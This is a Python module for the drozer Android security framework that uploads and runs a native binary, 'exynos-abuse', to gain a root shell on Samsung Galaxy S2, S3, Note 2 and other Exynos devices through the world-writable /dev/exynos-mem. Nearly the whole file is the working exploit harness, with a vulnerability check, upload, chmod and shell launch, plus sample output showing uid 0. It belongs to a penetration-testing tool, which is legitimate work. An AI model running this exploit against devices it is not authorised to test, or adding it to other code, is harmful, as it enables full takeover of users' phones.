import os

from drozer.modules import common, Module

class ExynosMem(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Obtain a root shell on Samsung Galaxy S2, S3, Note 2 and some other devices."
    description = """Escalate privileges to root on Samsung Galaxy S2, S3, Note 2 and other devices using Exynos processors and Samsung kernel sources.

This module uses the vulnerability and exploit provided in http://forum.xda-developers.com/showthread.php?p=35469999

The provided exploit makes use of the fact that /dev/exynos-mem is marked as globally RW and so can be exploited from the context of any application to obtain a root shell on the device.
"""
    examples = """
    dz> run exploit.root.exynosmem
    [*] Uploading exynos-abuse
    [*] Upload successful
    [*] chmod 770 exynos-abuse
    [*] s_show->seq_printf format string found at: 0xC079E284
    [*] sys_setresuid found at 0xC0094588
    [*] patching sys_setresuid at 0xC00945CC
    u0_a95@android:/data/data/com.mwr.dz # id
    uid=0(root) gid=10095(u0_a95) groups=1028(sdcard_r),3003(inet)
    """

    author = ["alephzain (xdadevelopers)", "Tyrone (@mwrlabs)"]
    date = "2013-12-12"
    license = "BSD (3 clause)"
    path = ["exploit", "root"]
    
    def isVulnerable(self, arguments):
        
        if "rw- " in self.shellExec("ls -l /dev/exynos-mem"):
            return 2 # Potentially Vulnerable
        else:
            return False

    def exploit(self, arguments):

        exynos_abuse = os.path.join(self.workingDir(), "exynos-abuse")

        # Remove if it is there
        self.shellExec("rm %s" % exynos_abuse)
        
        # Upload the exploit
        self.stdout.write("[*] Uploading exynos-abuse\n")
        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "exynos-abuse", "libs", "armeabi", "exynos-abuse"), exynos_abuse)

        # Open shell and execute
        if length != None:
            self.stdout.write("[*] Upload successful\n")
            self.stdout.write("[*] chmod 770 %s\n" % exynos_abuse)
            self.shellExec("chmod 770 %s" % exynos_abuse)
            
            self.shellStart(exynos_abuse)
        else:
            self.stderr.write("[*] Could not upload file\n")
